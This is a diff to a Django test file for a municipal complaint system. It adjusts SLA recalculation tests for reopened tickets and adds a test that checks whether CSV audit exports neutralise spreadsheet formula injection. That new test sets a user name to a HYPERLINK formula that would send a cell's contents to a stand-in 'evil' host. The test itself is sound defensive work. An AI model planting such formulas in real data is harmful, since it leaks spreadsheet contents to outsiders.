@@ -533,14 +533,20 @@ class TestCategorias:
         cli, admin = _usuario('admin_municipal')
         cat = Categoria.objects.get(nome='Entulho')  # base 15 dias
         aberto = _chamado(categoria='Entulho')
+        # Reaberto hoje, 60 dias depois de aberto: o prazo novo conta da reabertura.
+        reaberto = _chamado(categoria='Entulho', criado_em=timezone.now() - timedelta(days=60), reaberturas=1)
+        reaberto_em = timezone.now() - timedelta(hours=2)
+        DefeitoEvento.objects.create(defeito=reaberto, tipo='reaberto', publico=True, criado_em=reaberto_em)
         ajustado = _chamado(categoria='Entulho', prazo_sla_dias=30)  # ajuste manual: fica
         fechado = _chamado(categoria='Entulho', status='concluido')
         de_fora = _chamado(OUTRA, categoria='Entulho')
 
         r = cli.patch(reverse('gestao-categoria', args=[cat.id]), {'prazo_sla_dias': 5}, format='json')
         assert r.status_code == 200, r.data
-        assert r.data['prazo_sla_dias'] == 5 and r.data['chamados_recalculados'] == 1
+        assert r.data['prazo_sla_dias'] == 5 and r.data['chamados_recalculados'] == 2
 
+        reaberto.refresh_from_db()
+        assert reaberto.prazo_em == reaberto_em + timedelta(days=5)
         aberto.refresh_from_db()
         assert aberto.prazo_sla_dias == 5
         assert aberto.prazo_em == aberto.criado_em + timedelta(days=5)
@@ -551,11 +557,11 @@ class TestCategorias:
             assert outro.prazo_sla_dias in (15, 30)
             assert not DefeitoEvento.objects.filter(defeito=outro, tipo='sla').exists()
         log = AuditLog.objects.get(acao='categoria.alterar', alvo_id=str(cat.id))
-        assert log.dados['antes']['prazo_sla_dias'] == 15 and log.dados['chamados_recalculados'] == 1
+        assert log.dados['antes']['prazo_sla_dias'] == 15 and log.dados['chamados_recalculados'] == 2
 
         # null volta ao padrão da plataforma (e recalcula de novo).
         r = cli.patch(reverse('gestao-categoria', args=[cat.id]), {'prazo_sla_dias': None}, format='json')
-        assert r.data['prazo_sla_dias'] == 15 and r.data['chamados_recalculados'] == 1
+        assert r.data['prazo_sla_dias'] == 15 and r.data['chamados_recalculados'] == 2
 
     def test_validacoes(self):
         cli, _ = _usuario('admin_municipal')
@@ -720,6 +726,18 @@ class TestAuditoria:
         # Gestor não exporta (a auditoria é do administrador).
         gestor, _ = _usuario('gestor')
         assert gestor.get(reverse('gestao-auditoria') + '?formato=csv').status_code == 403
+
+    def test_csv_neutraliza_formula_no_nome(self):
+        import csv
+        import io
+
+        cli, admin = _usuario('admin_municipal')
+        admin.nome = '=HYPERLINK("http://evil/?"&A2;"Clique")'
+        admin.save(update_fields=['nome'])
+        cli.post(reverse('gestao-secretarias'), {'nome': 'Secretaria Fórmula'}, format='json')
+        r = cli.get(reverse('gestao-auditoria') + '?formato=csv&acao=secretaria')
+        linhas = list(csv.reader(io.StringIO(r.content.decode('utf-8').lstrip('﻿')), delimiter=';'))
+        assert linhas[1][1] == "'" + admin.nome
 
 
 # ------------------------------------------------------------------- seed
